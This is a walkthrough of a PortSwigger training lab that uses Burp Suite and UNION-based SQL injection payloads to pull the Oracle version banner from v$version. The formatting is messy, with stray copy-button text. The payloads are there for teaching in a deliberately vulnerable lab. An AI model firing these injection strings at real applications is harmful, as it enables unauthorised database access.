# Lab: SQL injection attack, querying the database type and version on Oracle

**Lab Link:** [https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

## Explanation

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION-based SQL injection to extract data from the database.

The goal is to retrieve and display the **Oracle database version string**, which is stored in the system view `v$version`.

---

## Step-by-step Solution

### 🔹 Step 1: Intercept the request

- Use **Burp Suite** to intercept a request to `/filter?category=...` by clicking on any product category in the application.
- Send the request to **Repeater** for testing.

Example intercepted request:

```http
GET /filter?category=Accessories HTTP/1.1
Host: your-lab-id.web-securityacademy.net
🔹 Step 2: Determine number of columns
Send this payload in the category parameter:

sql
Sao chép mã
'+UNION+SELECT+NULL,NULL+FROM+dual--
If the page loads without error → there are 2 columns in the original query.

🔹 Step 3: Identify which column(s) display text
Send a test with sample text:

sql
Sao chép mã
'+UNION+SELECT+'abc','def'+FROM+dual--
If you see abc or def on the page, those columns are capable of displaying text.

🔹 Step 4: Retrieve the Oracle version string
Now send the real payload to extract the Oracle version from the v$version table:

sql
Sao chép mã
'+UNION+SELECT+BANNER,NULL+FROM+v$version--
If successful, you will see output like:

nginx
Sao chép mã
Oracle Database 19c Enterprise Edition Release 19.0.0.0.0 - Production
Once this string is displayed, the lab will be marked as solved.